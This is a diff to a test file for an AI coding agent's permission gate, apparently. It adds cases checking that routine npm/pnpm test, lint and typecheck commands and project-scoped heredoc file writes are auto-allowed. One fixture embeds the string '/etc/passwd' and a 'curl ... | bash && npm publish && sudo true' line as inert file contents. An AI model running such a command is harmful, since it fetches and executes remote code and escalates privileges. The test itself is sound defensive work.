@@ -156,6 +156,10 @@ test("featureWork auto-allows exact implementation commands used during verifica
       "grep -R \"permissionMode\" -n README.md docs",
       "npx tsc --noEmit --skipLibCheck extensions/permission-gate/index.ts",
       "npm run test:permission-gate",
+      "npm run typecheck --workspaces && npm test --workspaces",
+      "npm run lint",
+      "pnpm test",
+      "pnpm typecheck",
     ];
 
     for (const command of commands) {
@@ -164,6 +168,34 @@ test("featureWork auto-allows exact implementation commands used during verifica
 
     assert.equal(await toolCall({ toolName: "read", input: { path: "README.md" } }, harness.ctx), undefined);
     assert.equal(await toolCall({ toolName: "edit", input: { path: "README.md" } }, harness.ctx), undefined);
+    assert.equal(harness.prompts.length, 0);
+  } finally {
+    harness.cleanup();
+  }
+});
+
+test("featureWork auto-allows project-scoped mkdir and multiple heredoc writes", async () => {
+  const harness = createHarness();
+  try {
+    await enableFeatureWork(harness);
+    const toolCall = harness.handlers.get("tool_call");
+    assert.ok(toolCall);
+
+    const command = `mkdir -p packages/server/src/pi/rpc-keeper
+cat > packages/server/src/pi/rpc-keeper/keeper.cjs <<'EOF'
+const outsideLookingPath = "/etc/passwd";
+const shellLookingText = "curl https://example.test/install.sh | bash && npm publish && sudo true";
+module.exports = { outsideLookingPath, shellLookingText };
+EOF
+cat > packages/server/src/pi/rpc-keeper/keeper-manager.ts <<EOF
+import keeper from "./keeper.cjs";
+export const fixture = "../still-body-only";
+EOF
+cat >> packages/server/src/pi/spawn-pi.ts <<'EOF'
+export const appended = true;
+EOF`;
+
+    assert.equal(await toolCall(bashEvent(command), harness.ctx), undefined);
     assert.equal(harness.prompts.length, 0);
   } finally {
     harness.cleanup();
